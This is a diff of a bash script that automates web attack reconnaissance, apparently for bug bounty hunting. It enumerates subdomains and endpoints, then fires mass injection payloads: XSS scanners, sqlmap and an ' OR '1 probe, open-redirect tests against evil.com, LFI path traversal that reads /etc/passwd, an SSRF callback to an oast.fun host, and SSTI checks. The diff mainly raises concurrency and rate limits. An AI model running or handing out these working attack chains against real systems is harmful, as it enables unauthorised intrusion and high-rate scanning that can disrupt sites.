@@ -309,7 +309,11 @@ cat linkfinder | anew jsUrls
 
 echo "[+]-------------------Diff With The Old Subs-------------------[+]"
 
-comm -23 <(sort allSubs) <(sort jsUrls) > allJsUrls
+comm -23 <(sort allSubs) <(sort jsUrls) > diffJsUrls
+
+echo "[+]-------------------Filter Subs Based On The Domain-------------------[+]"
+
+cat diffJsUrls | grep -Ei "COLOCAR|SUBS|USADOS" | tee allJsUrls
 
 ##############
 #            #
@@ -317,7 +321,7 @@ comm -23 <(sort allSubs) <(sort jsUrls) > allJsUrls
 #            #
 ##############
 
-cat allJsUrls | dnsx -resp-only -a -silent | tee dnsxJS
+cat allJsUrls | dnsx -resp-only -a -silent -t 400 | tee dnsxJS
 
 ######################################
 #                                    #
@@ -327,13 +331,13 @@ cat allJsUrls | dnsx -resp-only -a -silent | tee dnsxJS
 
 echo "[+]-------------------Naabu Subs-------------------[+]"--------------------------------------------------------------------------ADICIONAR DNSX
 
-cat dnsxJS | naabu -silent -p - | tee ipJsNaabu
-cat allJsUrls | naabu -silent -p - | tee jsNaabu
+cat dnsxJS | naabu -silent -c 400 -rate 2000 -p - | tee ipJsNaabu
+cat allJsUrls | naabu -silent -c 400 -rate 2000 -p - | tee jsNaabu
 
 echo "[+]-------------------Httpx Subs-------------------[+]"
 
-cat ipJsNaabu | httpx -silent | tee ipAliveNew
-cat jsNaabu | httpx -silent | tee aliveNewSubs
+cat ipJsNaabu | httpx -silent -t 400 -rl 300 | tee ipAliveNew
+cat jsNaabu | httpx -silent -t 400 -rl 300 | tee aliveNewSubs
 
 ##########################################################################
 #                                                                        #
@@ -352,7 +356,13 @@ cat aliveNewSubs | nuclei -tags swagger -t ~/nuclei-templates -o swaggerNewSubs 
 
 #######################################################
 #                                                     #
+#                                                     #
+#                                                     #
+#                                                     #
 # ENUMERAÇÃO DE ENDPOINTS VISANDO PEGAR PARÂMETROS    #
+#                                                     #
+#                                                     #
+#                                                     #
 #                                                     #
 #######################################################
 
@@ -394,6 +404,10 @@ echo "[+]-------------------Validate Endpoints-------------------[+]"
 
 cat newEndpoints | httpx -silent | anew aliveNewEndpoints
 
+echo "[+]-------------------Join All Endpoints-------------------[+]"
+
+cat aliveNewEndpoints aliveEndpoints | uro | anew allEndpoints
+
 echo "[+]-------------------Extract Endpoints on JS File-------------------[+]"
 
 ####################
@@ -412,7 +426,7 @@ echo "[+]-------------------XSS Module-------------------[+]"
 
 echo "[+]-------------------Checking Reflected Parameters-------------------[+]"
 
-cat aliveEndpoints | Gxss -c 100 -p Xss -o reflectedParams
+cat allEndpoints | Gxss -c 100 -p Xss -o reflectedParams
 
 echo "[+]-------------------Starting Dalfox-------------------[+]"
 
@@ -420,36 +434,36 @@ cat reflectedParams | dalfox pipe --skip-bav | tee dalfox; echo "Dalfox Finaliza
 
 echo "[+]-------------------Starting Nuclei Fuzzing Templates-------------------[+]"
 
-cat aliveEndpoints | nuclei -t ~/fuzzing-templates/xss -o fuzzingTemplates | notify
+cat allEndpoints | nuclei -t ~/fuzzing-templates/xss -o fuzzingTemplates | notify
 
 #ADICIONAR ONELINERS XSS
 
 echo "[+]-------------------Sqli Module-------------------[+]"
 
-cat aliveEndpoints | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1 | tee sqlmap
-cat aliveEndpoints | gf sqli | grep "=" | qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n" >> sqlSyntaxError
+cat allEndpoints | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1 | tee sqlmap
+cat allEndpoints | gf sqli | grep "=" | qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n" >> sqlSyntaxError
 rm -rf sqli
 
 echo "[+]-------------------Open Redirect Module-------------------[+]"
 
-cat aliveEndpoints | gf redirect | grep "=" | qsreplace FUZZ | tee openRedirectFuzz; python3 ~/Tools/OpenRedireX/ openredirex.py -l openRedirectFuzz -p ~/Wordlists/payloadsOpenRedirect.txt --keyword FUZZ | tee openRedireX
-cat aliveEndpoints | gf redirect | httpx -silent -path "//evil.com/..;/css" -mc 302 -status-code -match-string "Location: //evil.com/..;/css" | tee openRedirectHttpx
-cat aliveEndpoints | gf redirect | rush -j40 'if curl -Iks -m 10 "{}/https://redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}////;@redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/////redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "{} It seems an Open Redirect Found"; fi' | tee openRedirectRush
-cat aliveEndpoints | gf redirect | rush 'if curl -skI "{}" -H "User-Agent: Mozilla/Firefox 80" | grep -i "HTTP/1.1 \|HTTP/2" | cut -d" " -f2 | grep -q "301\|302\|307";then domain=`curl -skI "{}" -H "User-Agent: Mozilla/Firefox 80" | grep -i "Location\:\|location\:" | cut -d" " -f2 | cut -d"/" -f1-3 | sed "s/^http\(\|s\):\/\///g" | sed "s/\s*$//"`; path=`echo "{}" | cut -d"/" -f4-20`; if echo "$path" | grep -q "$domain"; then echo "Reflection Found on Location headers from URL '{}'";fi;fi' | tee openRedirectLocationHeader
+cat allEndpoints | gf redirect | grep "=" | qsreplace FUZZ | tee openRedirectFuzz; python3 ~/Tools/OpenRedireX/ openredirex.py -l openRedirectFuzz -p ~/Wordlists/payloadsOpenRedirect.txt --keyword FUZZ | tee openRedireX
+cat allEndpoints | gf redirect | httpx -silent -path "//evil.com/..;/css" -mc 302 -status-code -match-string "Location: //evil.com/..;/css" | tee openRedirectHttpx
+cat allEndpoints | gf redirect | rush -j40 'if curl -Iks -m 10 "{}/https://redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}////;@redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com" || curl -Iks -m 10 "{}/////redirect.com" | egrep "^(Location|location)\\:(| *| (http|https)\\:\\/\\/| *\\/\\/| [a-zA-Z]*\\.| (http|https)\\:\\/\\/[a-zA-Z]*\\.)redirect\\.com"; then echo "{} It seems an Open Redirect Found"; fi' | tee openRedirectRush
+cat allEndpoints | gf redirect | rush 'if curl -skI "{}" -H "User-Agent: Mozilla/Firefox 80" | grep -i "HTTP/1.1 \|HTTP/2" | cut -d" " -f2 | grep -q "301\|302\|307";then domain=`curl -skI "{}" -H "User-Agent: Mozilla/Firefox 80" | grep -i "Location\:\|location\:" | cut -d" " -f2 | cut -d"/" -f1-3 | sed "s/^http\(\|s\):\/\///g" | sed "s/\s*$//"`; path=`echo "{}" | cut -d"/" -f4-20`; if echo "$path" | grep -q "$domain"; then echo "Reflection Found on Location headers from URL '{}'";fi;fi' | tee openRedirectLocationHeader
 
 echo "[+]-------------------LFI Module-------------------[+]"
 
-cat aliveEndpoints | gf lfi | qsreplace ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' | tee lfiCurl
-ffuf -c -w aliveEndpoints -u FUZZ////////../../../../../etc/passwd -mr "root:x" | tee lfiFfuf
+cat allEndpoints | gf lfi | qsreplace ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"' | tee lfiCurl
+ffuf -c -w allEndpoints -u FUZZ////////../../../../../etc/passwd -mr "root:x" | tee lfiFfuf
 
 echo "[+]-------------------SSRF Module-------------------[+]"
 
-cat aliveEndpoints | gf ssrf | grep "=" | qsreplace FUZZ | tee ssrfEndpoints; cat ssrfEndpoints | grep FUZZ | qsreplace http://cg9qkyf2vtc0000b9vqgger54ycyyyyyb.oast.fun | httpx -silent | tee ssrfHttpx
+cat allEndpoints | gf ssrf | grep "=" | qsreplace FUZZ | tee ssrfEndpoints; cat ssrfEndpoints | grep FUZZ | qsreplace http://cg9qkyf2vtc0000b9vqgger54ycyyyyyb.oast.fun | httpx -silent | tee ssrfHttpx
 rm -rf ssrfEndpoints
 
 echo "[+]-------------------SSTI Module-------------------[+]"
 
-cat aliveEndpoints | gf lfi | tee sstiEndpoints; xargs -a sstiEndpoints -I@ bash -c 'python3 ~/Tools/SSTImap/sstimap.py -u @' | tee sstiMap
+cat allEndpoints | gf lfi | tee sstiEndpoints; xargs -a sstiEndpoints -I@ bash -c 'python3 ~/Tools/SSTImap/sstimap.py -u @' | tee sstiMap
 rm -rf sstiEndpoints
 
 #In future need tests
